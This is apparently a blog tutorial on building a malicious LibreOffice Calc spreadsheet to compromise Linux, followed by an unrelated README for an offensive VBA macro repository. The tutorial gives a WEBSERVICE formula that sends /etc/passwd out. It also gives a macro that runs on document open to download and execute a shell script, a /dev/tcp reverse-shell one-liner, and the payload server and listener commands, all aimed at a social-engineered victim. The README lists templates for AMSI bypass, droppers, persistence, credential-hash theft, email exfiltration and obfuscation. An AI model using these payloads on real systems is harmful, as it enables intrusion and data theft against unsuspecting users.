

##
#
https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
#
##

USING MALICIOUS LIBREOFFICE CALC MACROS TO TARGET LINUX
 




I've been wondering for a while about the viability and methodology of pwning a Linux box via a malicious LibreOffice Calc spreadsheet so I decided to do some experimentation. This post outlines my research and findings.

Best I can tell, LibreOffice removed DDE functionality as it pertains to arbitrary operating system commands with the advent of CVE-2014-3524. (Please comment and correct me if I'm wrong.) This apparently means it's no longer possible to perform operating system commands with Excel-style attacks, which potentially rules out running operating system commands via CSV injection. Still, there are are some pretty cool data exfiltration exploits out there with LibreOffice Calc formulas that utilize the WEBSERVICE function like this one:

=WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))

But if you want to achieve operating system command execution, it seems you will need a LibreOffice Calc macro, written in LibreOffice Basic, a dialect of BASIC. I'm going to show you how I achieved a reverse shell in my lab, using a such macro. It may not be elegant, but it works. Please feel free to comment if you know of a simpler way.

Before I start, keep in mind there are lots of caveats to exploits embedded in spreadsheets. With any luck, the victim's instance of Calc is configured with a lenient setting for macros and the victim has been conditioned to click through warnings. On the other hand, Linux is not widely used by unsavvy users, making the chance of social engineering more difficult.

In order to duplicate what I've done here, you will need both an HTTP server to host a malicious file, and a C2. The former can be done easily with Python, and the latter with netcat.

With these caveats in mind, let's get started. The first thing we need is a benign looking Calc spreadsheet, with some mock data for use with social engineering. Then we need to create a malicious macro within this spreadsheet. To create the macro, navigate to the following:

Tools>Macros>Organize Macros>Basic...

Once there, you should see My Macros, LibreOffice Macros, and the current filename. To make our macro apply only to our malicious file, we need to select our filename and click 'New'. You can name it anything and then click 'OK'. The Object Catalog should then open, with your new macro selected and ready for edits. The exploit I'm using is below. I tried reverse shell one liners, but ran into problems and found it easiest for the payload to download a malicious shell script and then execute it. You could also replace this with an msfvenom payload. To use my exploit, replace all of the sample text in your macro with the following:

```
Sub evil

    Shell("wget http://127.0.0.1:665/reverse-shell.sh")
    Shell("chmod +x reverse-shell.sh")
    Shell("bash -c ./reverse-shell.sh")
    
End Sub
```

Once this is complete, close the window and I'll show you how to assign the macro to the 'Open Document' event so it will be run when opening the spreadsheet. NOTE: It's important that you close the Object Catalog window and reopen the Organize Macros window when performing this action, otherwise it won't be possible to assign document-specific macros to events. (I found that the Organize Macros window won't let you assign document-specific macros to events if opened from the Object Catalog window.) Below are the steps to perform after closing the Object Catalog window. You'll need to navigate here again:

Tools>Macros>Organize Macros>Basic...

This time, you'll select your new document-specific macro and click 'Assign...'  Then select the 'Open Document' event and click 'Macro...' Navigate to and select your new macro and then click 'OK' and 'Close'. (If you configured it correctly, the event should look like the screenshot below.)



Next, it's time to prepare our malicious shell script which will be downloaded by our macro, and our C2. Create a file called reverse-shell.sh and populate it with this text:

exec 5<>/dev/tcp/127.0.0.1/666 ; cat <&5 | while read muahaha; do $muahaha 2>&5 >&5; done

Then host the file on your malware server using Python3:

sudo python3 -m http.server 665

And start your C2:

sudo nc -lp 666

Now close and reopen your malicious file, and you should have a reverse shell on your C2. Type whoami, etc. from netcat and if everything looks good, you should be ready to launch your social engineering attack. If you have trouble, check your security settings in Calc and make sure you click through any warnings. (Also, I noticed that if I try the exploit a second time it doesn't work unless I delete reverse-shell.sh each time.)

I now feel I have a better idea of exactly what attacks can be done with LibreOffice Calc and how to protect myself. Needless to say, one must be vigilant when it comes to untrusted files.

Links:
https://notsosecure.com/data-exfiltration-formula-injection-part1
https://www.cvedetails.com/cve/CVE-2014-3524/
https://blog.documentfoundation.org/blog/2014/08/28/libreoffice-4-3-1-fresh-announced/
https://wiki.openoffice.org/wiki/Documentation/BASIC_Guide/Other_Functions_(Runtime_Library)
https://wiki.documentfoundation.org/images/d/da/CG7210-LinkingCalcData.pdf
https://ask.libreoffice.org/t/auto-run-macro-on-open-cant-assign-to-macro-in-document/5474
https://help.libreoffice.org/6.1/he/text/sbasic/shared/03130500.html
https://help.libreoffice.org/Basic/Shell_Function_Runtime
https://stackoverflow.com/questions/11969378/running-a-os-command-from-a-macro
https://documentation.libreoffice.org/assets/Uploads/Documentation/en/CG4.1/PDF/CG4112-CalcMacros.pdf

Test environment:
Kali Linux 2022.1
LibreOffice Calc 7.3.1.1


# OffensiveVBA

In preparation for a VBS AV Evasion Stream/Video I was doing some research for Office Macro code execution methods and evasion techniques.

The list got longer and longer and I found no central place for offensive VBA templates - so this repo can be used for such. It is very far away from being complete. If you know any other cool technique or useful template feel free to contribute and create a pull request!

Most of the templates in this repo were already published somewhere. I just copy pasted most templates from ms-docs sites, blog posts or from other tools.

## Templates in this repo

| File | Description |
| ---  | --- |
| [ShellApplication_ShellExecute.vba](./src/ShellApplication_ShellExecute.vba) | Execute an OS command via ShellApplication object and ShellExecute method |
| [ShellApplication_ShellExecute_privileged.vba](./src/ShellApplication_ShellExecute_privileged.vba) | Execute an privileged OS command via ShellApplication object and ShellExecute method - UAC prompt |
| [Shellcode_CreateThread.vba](./src/Shellcode_CreateThread.vba) | Execute shellcode in the current process via Win32 CreateThread |
| [Shellcode_EnumChildWindowsCallback.vba](./src/Shellcode_EnumChildWindowsCallback.vba) | Execute shellcode in the current process via EnumChildWindows |
| [Win32_CreateProcess.vba](./src/Win32_CreateProcess.vba) | Create a new process for code execution via Win32 CreateProcess function |
| [Win32_ShellExecute.vba](./src/Win32_ShellExecute.vba) | Create a new process for code execution via Win32 ShellExecute function |
| [WMI_Process_Create.vba](./src/WMI_Process_Create.vba) | Create a new process via WMI for code execution |
| [WMI_Process_Create2.vba](./src/WMI_Process_Create2.vba) | Another WMI code execution example |
| [WscriptShell_Exec.vba](./src/WscriptShell_Exec.vba) | Execute an OS command via WscriptShell object and Exec method |
| [WscriptShell_run.vba](./src/WscriptShell_run.vba) | Execute an OS command via WscriptShell object and Run method |
| [VBA-RunPE](https://github.com/itm4n/VBA-RunPE/tree/master) | [@itm4n's](https://twitter.com/itm4n) RunPE technique in VBA |
| [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript/tree/master) | [med0x2e's](https://github.com/med0x2e) C# script for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts.  |
| [PPID_Spoof.vba](./src/PPID_Spoof.vba) | [christophetd's](https://github.com/christophetd)  [spoofing-office-macro](https://github.com/christophetd/spoofing-office-macro) copy |
| [AMSIBypass_AmsiScanBuffer_ordinal.vba](./src/AMSIBypass_AmsiScanBuffer_ordinal.vba) | [rmdavy's](https://github.com/rmdavy) AMSI Bypass to patch AmsiScanBuffer using ordinal values for a signature bypass |
| [AMSIBypass_AmsiScanBuffer_Classic.vba](./src/AMSIBypass_AmsiScanBuffer_Classic.vba) | [rasta-mouse's](https://github.com/rasta-mouse) classic AmsiScanBuffer patch |
| [AMSIBypass_Heap.vba](./src/AMSIBypass_Heap.vba) | [rmdavy's](https://github.com/rmdavy) [HeapsOfFun](https://github.com/rmdavy/HeapsOfFun) repo copy  |
| [AMSIbypasses.vba](./src/AMSIbypasses.vba) | [outflanknl's](https://github.com/outflanknl) [AMSI bypass blog](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/) |
| [COMHijack_DLL_Load.vba](./src/COMHijack_DLL_Load.vba) | Load DLL via COM Hijacking |
| [COM_Process_create.vba](./src/COM_Process_create.vba) | Create process via COM object |
| [Download_Autostart.vba](./src/Download_Autostart.vba) | Download a file from a remote webserver and put it into the StartUp folder |
| [Download_Autostart_WinAPI.vba](./src/Download_Autostart_WinAPI.vba) | Download a file from a remote webserver via URLDownloadtoFileA and put it into the StartUp folder |
| [Dropper_Autostart.vba](./src/Dropper_Autostart.vba) | Drop batch file into the StartUp folder |
| [Registry_Persist_wmi.vba](./src/Registry_Persist_wmi.vba) | Create StartUp registry key for persistence via WMI |
| [Registry_Persist_wscript.vba](./src/Registry_Persist_wscript.vba) | Create StartUp registry key for persistence via wscript object |
| [ScheduledTask_Create.vba](./src/ScheduledTask_Create.vba) | Create and start sheduled task for code execution/persistence |
| [XMLDOM_Load_XSL_Process_create.vba](./src/XMLDOM_Load_XSL_Process_create.vba) | Load XSL from a remote webserver to execute code |
| [regsvr32_sct_DownloadExecute.vba](./src/regsvr32_sct_DownloadExecute.vba) | Execute regsvr32 to download a remote webservers SCT file for code execution |
| [BlockETW.vba](./src/BlockETW.vba) | Patch EtwEventWrite in ntdll.dll to block ETW data collection |
| [BlockETW_COMPLUS_ETWEnabled_ENV.vba](./src/BlockETW_COMPLUS_ETWEnabled_ENV.vba) | Block ETW data collection by setting the environment variable COMPLUS_ETWEnabled to 0, credit to [@_xpn_](https://twitter.com/_xpn_) |
| [ShellWindows_Process_create.vba](./src/ShellWindows_Process_create.vba) | ShellWindows Process create to get explorer.exe as parent process |
| [AES.vba](./src/AES.vba) | An example to use AES encryption/decryption in VBA from [Here](https://github.com/susam/aes.vbs/blob/a0cb5f9ffbd90b435622f5cfdb84264e1a319bf2/aes.vbs) |
| [Dropper_Executable_Autostart.vba](./src/Dropper_Executable_Autostart.vba) | Get executable bytes from VBA and drop into Autostart - no download in this case |
| [MarauderDrop.vba](./src/MarauderDrop.vba) | Drop a COM registered .NET DLL into temp, import the function and execute code - in this case loads a remote C# binary from a webserver to memory and executes it - credit to [@Jean_Maes_1994](https://twitter.com/Jean_Maes_1994) for [MaraudersMap](https://github.com/NVISOsecurity/blogposts/tree/master/MaraudersMap) |
| [Dropper_Workfolders_lolbas_Execute.vba](./src/Dropper_Workfolders_lolbas_Execute.vba) | Drop an embedded executable into the TEMP directory and execute it using C:\windows\system32\Workfolders.exe as LOLBAS - credit to [@YoSignals](https://www.ctus.io/2021/04/12/exploading/) |
| [SandBoxEvasion](./src/SandBoxEvasion/) | Some SandBox Evasion templates |
| [Evasion Dropper Autostart.vba](./src/Evasion_Dropper_Autostart.vba)| Drops a file to the Startup directory bypassing file write monitoring via renamed folder operation|
|[Evasion MsiInstallProduct.vba](./src/Evasion%20MsiInstallProduct.vba)| Installs a remote MSI package using WindowsInstaller ActiveXObject avoiding spawning suspicious office child process, the msi installation will be executed as a child of the `MSIEXEC /V service`|
|[StealNetNTLMv2.vba](./src/StealNetNTLMv2.vba)| Steal NetNTLMv2 Hash via share connection - credit to [https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds](https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds)|
|[Parse-Outlook.vba](./src/Parse-Outlook.vba)| Parses Outlook for sensitive keywords and file extensions, and exfils them via email - credit to [JohnWoodman](https://github.com/JohnWoodman/VBA-Macro-Projects)|
|[Reverse-Shell.vba](./src/Reverse-Shell.vba)| Reverse shell written entirely in VBA using Windows API calls - credit to [JohnWoodman](https://github.com/JohnWoodman/VBA-Macro-Projects)|



## Missing - ToDos
| File | Description |
| ---  | --- |
| [Unhooker.vba](./src/Unhooker.vba) | Unhook API's in memory to get rid of hooks |
| [Syscalls.vba](./src/Syscalls.vba) | Syscall usage - fresh from disk or Syswhispers like |
| [Manymore.vba](./src/Manymore.vba) | If you have any more ideas feel free to contribute |


## Obfuscators / Payload generators

1) [VBad](https://github.com/Pepitoh/VBad)
2) [wePWNise](https://github.com/FSecureLABS/wePWNise)
3) [VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator/tree/master) - needs some modification as it doesn't split up lines and is therefore not usable for office document macros
4) [macro_pack](https://github.com/sevagas/macro_pack)
5) [shellcode2vbscript.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/shellcode2vbscript.py)
6) [EvilClippy](https://github.com/outflanknl/EvilClippy)
7) [OfficePurge](https://github.com/mandiant/OfficePurge)
8) [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
9) [VBS-Obfuscator-in-Python](https://github.com/kkar/VBS-Obfuscator-in-Python) - - needs some modification as it doesn't split up lines and is therefore not usable for office document macros

## Credits / usefull resources

ASR bypass:
http://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf

Shellcode to VBScript conversion:
https://github.com/DidierStevens/DidierStevensSuite/blob/master/shellcode2vbscript.py

Bypass AMSI in VBA:
https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/

VBA purging:
https://www.mandiant.com/resources/purgalicious-vba-macro-obfuscation-with-vba-purging

F-Secure VBA Evasion and detection post:
https://blog.f-secure.com/dechaining-macros-and-evading-edr/

One more F-Secure blog:
https://labs.f-secure.com/archive/dll-tricks-with-vba-to-improve-offensive-macro-capability/
